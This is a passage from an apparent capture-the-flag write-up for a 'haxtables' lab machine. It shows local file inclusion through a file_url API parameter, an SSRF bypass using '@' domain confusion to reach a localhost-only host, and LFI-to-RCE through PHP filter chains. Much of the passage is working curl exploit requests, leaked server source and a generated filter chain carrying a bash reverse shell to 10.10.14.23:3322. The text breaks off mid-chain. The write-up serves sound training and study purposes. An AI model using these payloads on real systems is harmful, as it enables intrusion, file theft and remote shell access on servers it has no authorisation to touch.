/proc/self/status       [Status: 200, Size: 1907, Words: 1, Lines: 1, Duration: 34ms]
/proc/version           [Status: 200, Size: 255, Words: 1, Lines: 1, Duration: 57ms]
/usr/share/adduser/adduser.conf [Status: 200, Size: 4051, Words: 1, Lines: 1, Duration: 37ms]
:: Progress: [771/771] :: Job [1/1] :: 1154 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

When looking at `/etc/apache2/ports.conf` , a comment references `/etc/apache2/sites-enabled/000-default.conf`:

```
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf
```

Looking at this file:

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///etc/apache2/sites-enabled/000-default.conf"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2048    0  1959  100    89  43267   1965 --:--:-- --:--:-- --:--:-- 46545
<VirtualHost *:80>
    ServerName haxtables.htb
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html


    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>


<VirtualHost *:80>
    ServerName api.haxtables.htb
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/api
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
        ServerName image.haxtables.htb
        ServerAdmin webmaster@localhost

    DocumentRoot /var/www/image

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
    #SecRuleEngine On

    <LocationMatch />
          SecAction initcol:ip=%{REMOTE_ADDR},pass,nolog,id:'200001'
          SecAction "phase:5,deprecatevar:ip.somepathcounter=1/1,pass,nolog,id:'200002'"
          SecRule IP:SOMEPATHCOUNTER "@gt 5" "phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:'200003'"
          SecAction "phase:2,pass,setvar:ip.somepathcounter=+1,nolog,id:'200004'"
          Header always set Retry-After "10" env=RATELIMITED
    </LocationMatch>

    ErrorDocument 429 "Rate Limit Exceeded"

        <Directory /var/www/image>
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </DIrectory>

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

With the `DocumentRoot /var/www/html`, we can retrieve `index.php` -- which doesn't contain much interesting.  We also have `DocumentRoot /var/www/api` , which is the location of the API we exploited via LFI.  Let's look at the strings PHP script we exploited:

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///var/www/api/v3/tools/string/index.php"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1995    0  1911  100    84  43627   1917 --:--:-- --:--:-- --:--:-- 46395
<?php
include_once '../../../utils.php';
include_once 'utils.php';


if (isset($_FILES['data_file'])) {
    $action = $_POST['action'];
    $data = file_get_contents($_FILES['data_file']['tmp_name']);
} else {
    $jsondata = json_decode(file_get_contents('php://input'), true);
    $action = $jsondata['action'];

    if ( empty($jsondata) || !array_key_exists('action', $jsondata)) 
    {
        echo jsonify(['message' => 'Insufficient parameters!']);

    }

    if (array_key_exists('file_url', $jsondata)) {
        $data = get_url_content($jsondata['file_url']);
    } else {
        $data = $jsondata['data'];
    }

}


if ($action  === 'str2hex') {
    echo jsonify(['data'=> str2hex($data)]);

} else if  ($action === 'hex2str') {
    echo jsonify(['data' => hex2str($data) ]);

} else if ($action === 'md5') {
    echo jsonify(['data'=> md5($data)]);

} else if ($action === 'sha1') {
    echo jsonify(['data'=> sha1($data)]);

} else if ($action === 'urlencode') {
    echo jsonify(['data'=> urlencode($data)]);

} else if ($action === 'urldecode') {
    echo jsonify(['data'=> urldecode($data)]);

} else if ($action === 'b64encode') {
    echo jsonify(['data'=> base64_encode($data)]);

} else if ($action === 'b64decode') {
    echo jsonify(['data'=> base64_decode($data)]);

} else {
    echo jsonify(['message'=> 'Invalid action'], 404);
}

?>%                             
```

 This includes `../../../utils.php`, which contains the following:

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///var/www/api/utils.php"}' | jq -r .data | base64 -d 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2543    0  2475  100    68  55661   1529 --:--:-- --:--:-- --:--:-- 57795
<?php

// Global functions

function jsonify($body, $code = null)
{
    if ($code) {
        http_response_code($code);
    }

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($body);

    exit;
}


function get_included_contents($filename) {
    ob_start();
    include $filename;
    return ob_get_clean();
}

function get_url_content($url){
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
    jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;
}

function make_api_call($action, $data, $uri_path, $is_file = false){
    if ($is_file) {
        $post = [
            'data' => file_get_contents($data),
            'action' => $action,
            'uri_path' => $uri_path
        ];
    } else {
        $post = [
            'data' => $data,
            'action' => $action,
            'uri_path' => $uri_path
        ];
    }

    $ch = curl_init();
    $url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;


}

?>
```

Here's the source of `/handler.php`, which is the wrapper used by the web interface to call the underlying API:

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///var/www/html/handler.php"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1155    0  1084  100    71  24394   1597 --:--:-- --:--:-- --:--:-- 26250
<?php
include_once '../api/utils.php';

if (isset($_FILES['data_file'])) {
    $is_file = true;
    $action = $_POST['action'];
    $uri_path = $_POST['uri_path'];
    $data = $_FILES['data_file']['tmp_name'];

} else {
    $is_file = false;
    $jsondata = json_decode(file_get_contents('php://input'), true);
    $action = $jsondata['action'];
    $data = $jsondata['data'];
    $uri_path = $jsondata['uri_path'];



    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
    {
        echo jsonify(['message' => 'Insufficient parameters!']);
        // echo jsonify(['message' => file_get_contents('php://input')]);

    }

}

$response = make_api_call($action, $data, $uri_path, $is_file);
echo $response;

?>
```

I noticed the images convert page just says *Coming soon!*:

![](./assets/2023-04-05-20-29-11-image.png)

But this is clearly defined in the Apache config:

```
        <Directory /var/www/image>
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </Directory>
```

So looking at `/var/www/images/index.php`:

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///var/www/image/index.php"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   189    0   119  100    70   2495   1468 --:--:-- --:--:-- --:--:--  4021
<?php 

include_once 'utils.php';

include 'includes/coming_soon.html';

?>%                                          
```

The `utils.php` script here looks different..

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///var/www/image/utils.php"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1749    0  1679  100    70  26867   1120 --:--:-- --:--:-- --:--:-- 28209
<?php

// Global functions

function jsonify($body, $code = null)
{
    if ($code) {
        http_response_code($code);
    }

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($body);

    exit;
}

function get_url_content($url)
{
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
        echo jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;

}

function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}
?>
```

There are extra `git_status()`, `git_log()` and `git_commit()` functions, all of which shell out using `shell_exec()` from within `/var/www/image` to call `/usr/bin/git` -- so it appears this directory is a git repository.

There's also a `sudo` command to run `/var/www/image/scripts/git-commit.sh` as the user `svc`.  The script in question, once again pulled using LFI as above:

```bash
#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
fi
```

Here's where I decided to do things a real quick & dirty way, and look at files in the `.git` directory using our LFI exploit - to read `config`, `HEAD`, `index`.  I toyed with the idea of using [gitdumper](https://github.com/arthaud/git-dumper), but looking at the `index` file gave me another hint quite quickly -- this is the staging area of a git repository, before something is committed:

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///var/www/image/.git/index"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1189    0  1118  100    71  25645   1628 --:--:-- --:--:-- --:--:-- 27651
DIRCcm9M1�Tcm9M1�TW����-`�S�ٽQ\A��xk��o��actions/action_handler.phpcm9M1�Tcm9M1�TW����⛲��CK�)�wZ���S�actions/image2pdf.phpcm9M1�Tcm9M1�TW�����b7
                                                                                                                                                 7��[�
                                                                                                                                                      v�=L���A>�ssets/img/forestbridge.jpgcm9M1�Tcm9M1�TW���3��2D��}��q���h���includes/coming_soon.htmlcm9M1�Tcm9M1�TW���Qr�㚔8��_c��kv.�pϋ    index.phpcm@7f�cm?����W�����0��+�>����,��IA�"�scripts/git-commit.shcm9M1�Tcm9M1�TW�����M�ʱ��'$;�~�x7�    utils.phpTREE�7 4
0a|�6��\�-��V�=
               j
                Iassets1 1
�Q["���t��]4��3����img1 0
=n`e�w����3�YL��actions2 0
&��s;N�$ω*D���includes1 00
*�2�ߛ����
         n���H���,�M����>�_1Y�{L�W%     
```

We see two paths `actions/action_handler.php` and `actions/image2pdf.php`:

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///var/www/image/actions/action_handler.php"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   354    0   267  100    87   6000   1955 --:--:-- --:--:-- --:--:--  8045
<?php

include_once 'utils.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} else {
    echo jsonify(['message' => 'No page specified!']);
}

?>%                  

$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///var/www/image/actions/image2pdf.php"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    93    0    11  100    82    210   1570 --:--:-- --:--:-- --:--:--  1788
```

So, `actions/action_handler.php` exists -- but `actions/image2pdf.php` does not.  We add `image.haxtables.htb` to our `/etc/hosts` -- and we *know* before even trying that this host / directory is only accessible from 127.0.0.1 -- due to the Apache config we found above with directives `Deny from all` and `Allow from 127.0.0.1`:

![](./assets/2023-04-05-20-50-29-image.png)

We know from before, that URL filtering is in place -- but we can bypass this in some circumstances to achieve SSRF on http://api.haxtables.htb/v3/tools/string/index.php 

in the `file_url` field in our JSON payload.  I tried a few bypass techniques such as `http://image.haxtables$foo.htb/` -- hoping the string interpolation would replace `$foo` with an empty string and bypass the SSRF, but this didn't work.

Looking back at `/handler.php` in our main app, we POST a payload as follows:

```json
{
    "action":"b64encode",
    "data":"hello world!",
    "uri_path":"/v3/tools/string"
}
```

`handler.php` simply checks for the existence of the `action` and `uri_path` keys, before calling `$response = make_api_call($action, $data, $uri_path, $is_file);`.  Our `make_api_call()` function is shown below:

```php
function make_api_call($action, $data, $uri_path, $is_file = false){
    if ($is_file) {
        $post = [
            'data' => file_get_contents($data),
            'action' => $action,
            'uri_path' => $uri_path
        ];
    } else {
        $post = [
            'data' => $data,
            'action' => $action,
            'uri_path' => $uri_path
        ];
    }

    $ch = curl_init();
    $url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;


}
```

So there's no filtering or validation to stop a URI containing localhost, but the URL is constructed as follows -- trying to force our input to be used as a path within `http://api.haxtables.htb`, and ending in `/index.php`:

```php
$url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
```

Can we bypass this?  Our [URL Format Bypass](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) page earlier include domain confusion techniques, such as:

```
http://{domain}@attacker.com
```

[RFC 3986: Uniform Resource Identifier (URI): Generic Syntax](https://www.rfc-editor.org/rfc/rfc3986) contains an authority component, where `userinfo`, usually comprising of `user:pass` is denoted before a domain with `@` (and shouldn't be used!).  By prefixing our `attacker.com` domain with `@`, then `http://{domain}` will be ignored and effectively treated as a username -- allowing us to change the domain.

So if we set `$uri_path` to `@image.haxtables.htb`, we end up with `http://api.haxtables.htb@image.haxtables.htb/index.php` . `http://api.haxtables.htb` will be treated as a username, and curl will subsequently request the domain/path `image.haxtables.htb/index.php`.  Confirming this works:

```bash
$curl "http://haxtables.htb/handler.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "data": "hello world", "uri_path": "@image.haxtables.htb"}'
<!DOCTYPE html>
<html>


<style>
body, html {
  height: 100%;
  margin: 0;
}

.bgimg {
  background-image: url('/assets/img/forestbridge.jpg');
  height: 100%;
  background-position: center;
  background-size: cover;
  position: relative;
  color: white;
  font-family: "Courier New", Courier, monospace;
  font-size: 25px;
}

.topleft {
  position: absolute;
  top: 0;
  left: 16px;
}

.bottomleft {
  position: absolute;
  bottom: 0;
  left: 16px;
}

.middle {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  text-align: center;
}

hr {
  margin: auto;
  width: 40%;
}
</style>
<body>

<div class="bgimg">

  <div class="middle">
    <h1>COMING SOON</h1>
    <hr>
    <p>35 days left</p>
  </div>
</div>

</body>
</html>
```

We've successfully bypassed the URI path restriction, and used SSRF to be able to hit `http://image.haxtables.htb`, despite this being blocked within the Apache config.  We can now try `/actions/action_handler?page=/etc/hosts` -- appending a `&` so the `/index.php` added within the `make_api_call()` function will be discarded and treated as a query param rather than part of the path:

```bash
$curl "http://haxtables.htb/handler.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "data": "hello world", "uri_path": "user@image.haxtables.htb/actions/action_handler.php?page=/etc/hosts&"}' 
127.0.0.1 localhost
127.0.1.1 encoding
127.0.0.1 haxtables.htb api.haxtables.htb image.haxtables.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Excellent!.. So we're able to use domain confusion starting with `user@` and ending with `&` to to inject our own URL achieving SSRF, and calling the `/actions/action_handler.php?page=/etc/hosts&` URL on the image host, which includes the `page` we specify -- `/etc/hosts` in this instance (another LFI).

Let's see how else we can exploit the `include($page);` in `/actions/action_handler.php`.  One option is log poisoning -- which allows us to take LFI and turn it into Remote Code Execution (RCE).

We could, for example, poison a log (e.g. apache access log) with a dangerous string such as `<?php shell_exec('..'); ?>`, then do LFI, so PHP will `include` this file, parsing and executing our dangerous string/code in an otherwise innocuous file.  I looked at `APACHE_LOG_DIR` in `/etc/apache2/envvars`, which pointed at `/var/log/apache2`, but I couldn't find the expected log file at `/var/log/apache2/access.log`.  I spent a bit of time here trying unsucccessfully locate logs we could poison.

Another LFI2RCE option is via PHP filters as per [LFI2RCE via PHP Filters - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters) and   [PHP filters chain: What is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html).  Essentially, if we achieve LFI, we can specify a file using the `php://` URI e.g. `php://filter/[..]/resource=test.txt`.  Our byte stream for file `test.txt` will pass through the filters specified within `[..]`

These filters, particularly `convert.iconv.*` will process stream data with `iconv()` -- allowing us to convert our stream from some input encoding to another output encoding.  Quite often, this conversion will result in characters being *prepended* to the existing stream.  Given the name of the machine, it seems this is likely the intended path to gaining a foothold.

By chaining (with `|`) these filters together, we can use LFI to load a file from disk, and prepend arbitrary characters to this file stream -- such that an `include` will allow us to include and execute arbitrary code in addition to including the file contents loaded from disk.

Our script on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters) contains a mapping of conversions, where for each value of arbtirary code we wish to load, we include the required filter chain. Better yet, Synacktive provide a script [here](https://github.com/synacktiv/php_filter_chain_generator) covering alphanumerics and some other special characters -- more than enough!.  Running the script to get a filter chain for our PHP reverse shell `<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.23/3322 0>&1\"'); ?>` (output not shown due to length):

```bash
$python php_filter_chain_generator.py --chain "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.23/3322 0>&1\"'); ?>"
[+] The following gadget chain will generate the following code : <?php system('bash -c "bash -i >& /dev/tcp/10.10.14.23/3322 0>&1"'); ?> (base64 value: PD9waHAgc3lzdGVtKCdiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIzLzMzMjIgMD4mMSInKTsgPz4)
```

Now, Let's use LFI and SSRF with our generated chained PHP filter, which in `/actions/action_handler.php` will use  `include()` to load the filtered temp file (we can even create arbitrary temp bytestreams to load with `php://temp` -- no need for read access to a known file on disk!) executing our reverse shell (PHP filter chain shown here in full within the `page` query param):

```bash
curl -v "http://haxtables.htb/handler.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "data": "hello world", "uri_path": "user@image.haxtables.htb/actions/action_handler.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM92